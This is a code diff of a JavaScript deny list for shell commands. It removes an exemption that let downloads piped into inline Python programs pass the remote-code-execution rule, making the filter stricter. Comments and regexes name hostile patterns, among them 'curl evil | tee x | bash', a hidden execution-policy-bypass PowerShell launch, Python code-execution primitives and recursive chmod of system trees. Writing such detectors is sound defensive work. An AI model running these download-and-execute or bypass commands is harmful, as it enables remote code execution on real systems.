@@ -90,49 +90,6 @@ function isProseAboutACommand(cmd) {
     clauses.every((c) => TEXT_SINK_RE.test(c) || PROSE_SIBLING_RE.test(c));
 }
 
-// A download piped into Python given its program INLINE (`python3 -c "…"`) reads the
-// download as DATA: parsing a JSON API response is the everyday case. It is remote code
-// execution only when the inline program runs what it reads, so the exemption holds only
-// when the inline code uses no primitive that evaluates, imports, opens or spawns, and only
-// when nothing else in the command routes into an interpreter. Node is not exempt: its
-// computed property access reaches code from data too easily to tell apart by text.
-// The program is one quoted word: single-quoted, or double-quoted with its escapes.
-const INLINE_INTERP_G = /\|\s*(python[0-9.]*)\s+((?:-[A-Za-z]{1,3}\s+){0,4})(?:-c)\s+(?:"((?:[^"\\]|\\[\s\S]){1,4000})"|'([^']{1,4000})')/gi;
-// Python: builtins that run or reach code, any dunder, imports outside a short list of
-// data-only modules (a module such as pdb, timeit or cProfile runs a string), and every
-// route to an already-loaded module or a frame's globals that needs no import: `sys.modules`
-// holds `os` at startup, `operator.attrgetter`/`methodcaller` and `string.Formatter().get_field`
-// reach attributes by string, and a traceback or generator frame leads to `f_globals`. An
-// allowed module can hold `os` as an attribute (`uuid.os`, `random._os` under statistics),
-// so the names that spawn are refused wherever they appear.
-const PY_EVALS = /\b(?:exec\w*|eval|compile|getattr|setattr|delattr|globals|locals|vars|breakpoint|input|open|help|memoryview|modules|meta_path|path_hooks|path_importer_cache|builtins|_getframe|settrace|setprofile|addaudithook|excepthook|displayhook|breakpointhook|unraisablehook|exc_info|exception|last_traceback|last_exc|tb_frame|tb_next|f_globals|f_locals|f_builtins|f_back|gi_frame|cr_frame|ag_frame|attrgetter|methodcaller|Formatter|get_field|vformat|os|_os|posix|nt|system|popen\w*|spawn\w*|fork\w*|subprocess|ctypes|platform)\b|__/;
-const PY_SAFE_MODULES = new Set(['sys', 'json', 'csv', 're', 'math', 'statistics', 'datetime', 'time', 'collections', 'itertools', 'functools', 'operator', 'string', 'textwrap', 'hashlib', 'decimal', 'fractions', 'pprint', 'unicodedata', 'urllib.parse', 'ipaddress', 'uuid']);
-const pyImportsSafe = (code) => {
-  for (const m of code.matchAll(/\bfrom\s+([\w.]+)\s+import\b|\bimport\s+([\w.]+(?:\s+as\s+\w+)?(?:\s*,\s*[\w.]+(?:\s+as\s+\w+)?)*)/g)) {
-    const mods = m[1] ? [m[1]] : m[2].split(',').map((s) => s.trim().split(/\s+/)[0]);
-    if (!mods.every((x) => PY_SAFE_MODULES.has(x))) return false;
-  }
-  return true;
-};
-const inlineIsData = (_interp, code) => !PY_EVALS.test(code) && pyImportsSafe(code);
-function pipesOnlyIntoInlineData(cmd) {
-  let found = false;
-  const rest = String(cmd).replace(INLINE_INTERP_G, (m, interp, _flags, dq, sq) => {
-    // a double-quoted program is expanded by the shell first: any $ or backtick in it
-    // means the program text is not what is written here
-    if (dq !== undefined && /[$`]/.test(dq)) return m;
-    const code = dq !== undefined ? dq.replace(/\\([\s\S])/g, '$1') : sq;
-    if (!inlineIsData(interp, code)) return m;
-    found = true;
-    return '| cat ';
-  });
-  if (!found) return false;
-  // Whatever is left must hold no other route to an interpreter, plain or disguised.
-  if (PIPE_INTERP.test(rest) || PIPE_INTERP.test(neutralizeQuotedData(rest))) return false;
-  if (/\$\{?IFS|\$\(|`|\beval\b|\bsource\b|\{[^}\s]*,[^}\s]*\}/.test(rest)) return false;
-  return true;
-}
-
 // Windows flag/value separator. PowerShell's -ArgumentList takes an ARRAY, so the
 // idiomatic spelling of a hidden/bypass launch is
 //   Start-Process powershell -ArgumentList '-ExecutionPolicy','Bypass','-WindowStyle','Hidden'
@@ -187,7 +144,7 @@ export const BLACK_SHELL = [
   // [^;\n]* (not [^|]*) so a download piped THROUGH filters (tee/gunzip/sed/xxd/
   // tac/rev) into an interpreter — `curl evil | tee x | bash` — is still caught,
   // staying within one pipeline (no ; to a separate command).
-  { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)', gate: (cmd) => pipeDownloadIsExternal(cmd) && !isProseAboutACommand(cmd) && !pipesOnlyIntoInlineData(cmd) },
+  { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)', gate: (cmd) => pipeDownloadIsExternal(cmd) && !isProseAboutACommand(cmd) },
   // recursive chmod of the root/system tree — any mode is destructive there:
   // 777 opens it world-writable, 000 locks even root out. Reuses the rm rule's
   // target clause so a benign deploy `chmod -R 755 /home/app/dist` (deep path)
